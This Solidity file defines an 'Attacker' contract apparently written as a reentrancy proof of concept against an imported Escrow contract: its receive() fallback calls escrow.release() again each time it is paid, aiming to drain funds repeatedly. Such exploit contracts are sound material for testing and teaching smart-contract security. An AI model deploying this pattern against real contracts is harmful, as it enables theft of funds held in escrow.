// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Escrow.sol";

contract Attacker {
    address public owner;
    Escrow public escrow;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can set escrow");
        _;
    }

    function setEscrow(address payable _escrowAddress) external onlyOwner {
        escrow = Escrow(_escrowAddress);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function doConfirmShipment(address escrowAddress) external {
        Escrow(payable(escrowAddress)).confirmShipment();
    }

    receive() external payable {
        if (address(escrow) != address(0)) {
            // Re-entrant call
            escrow.release();
        }
    }
}
